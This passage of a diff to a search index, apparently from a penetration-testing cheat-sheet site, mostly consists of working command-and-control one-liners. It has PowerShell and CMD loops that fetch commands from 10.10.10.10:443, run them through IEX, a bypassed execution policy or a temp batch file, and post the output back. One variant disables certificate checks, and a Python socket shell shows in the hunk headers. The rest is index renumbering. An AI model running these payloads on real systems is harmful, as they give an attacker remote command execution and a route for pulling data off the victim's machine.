([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} Powershell IEX Constr Lang Mode link $s='10.10.10.10:443';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8} Powershell Outfile link $s='10.10.10.10:443';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:Users$env:USERNAME.localhack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} Powershell Outfile Constr Lang Mode link $s='10.10.10.10:443';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:Users$env:USERNAME.localhack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8} CMD Curl HTTPS link @echo off\u0026cmd /V:ON /C \"SET ip=10.10.10.10:443\u0026\u0026SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"\u0026\u0026SET protocol=https://\u0026\u0026curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! \u003e NUL \u0026 for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! \u003e !temp!cmd.bat \u0026 type !temp!cmd.bat | findstr None \u003e NUL \u0026 if errorlevel 1 ((!temp!cmd.bat \u003e !tmp!out.txt 2\u003e\u00261) \u0026 curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt \u003e NUL)) \u0026 timeout 1\" \u003e NUL Powershell IEX HTTPS link add-type @\" using System.Net;using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}} \"@ [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy $s='10.10.10.10:443';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} "
-            }
-        );
-    index.add(
-            {
-                id:  5 ,
                 href: "\/docs\/enumeration\/",
                 title: "Enumeration",
                 description: "",
@@ -720,7 +1859,7 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
         );
     index.add(
             {
-                id:  6 ,
+                id:  5 ,
                 href: "\/docs\/shells\/web\/",
                 title: "Web",
                 description: "",
@@ -729,7 +1868,7 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
         );
     index.add(
             {
-                id:  7 ,
+                id:  6 ,
                 href: "\/docs\/reconnaissance\/",
                 title: "Reconnaissance",
                 description: "",
@@ -738,7 +1877,7 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
         );
     index.add(
             {
-                id:  8 ,
+                id:  7 ,
                 href: "\/docs\/",
                 title: "Docs",
                 description: "",
@@ -806,4 +1945,7 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
         }
     }
     }());
-</script></body></html>
+</script>
+        
+    </body>
+</html>
